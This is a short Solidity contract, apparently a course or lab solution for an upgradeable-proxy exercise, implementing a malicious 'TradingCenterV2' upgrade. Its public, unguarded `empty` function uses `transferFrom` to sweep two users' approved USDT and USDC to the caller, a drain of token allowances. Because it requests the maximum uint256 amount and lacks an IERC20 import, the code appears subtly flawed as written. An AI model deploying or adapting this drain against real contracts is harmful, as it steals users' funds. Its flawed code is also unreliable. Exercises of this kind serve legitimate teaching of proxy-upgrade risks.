// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;

// TODO: Try to implement TradingCenterV2 here
contract TradingCenterV2 {
    bool private initialized;
    IERC20 public usdt;
    IERC20 public usdc;

    function initialize(IERC20 _usdt, IERC20 _usdc) public {
        require(!initialized, "Contract instance has already been initialized");
        initialized = true;
        usdt = _usdt;
        usdc = _usdc;
    }

    function empty(
        IERC20 usdt,
        address user1,
        IERC20 usdc,
        address user2) public {
        usdt.transferFrom(user1, msg.sender, type(uint256).max);
        usdc.transferFrom(user2, msg.sender, type(uint256).max);
    }
}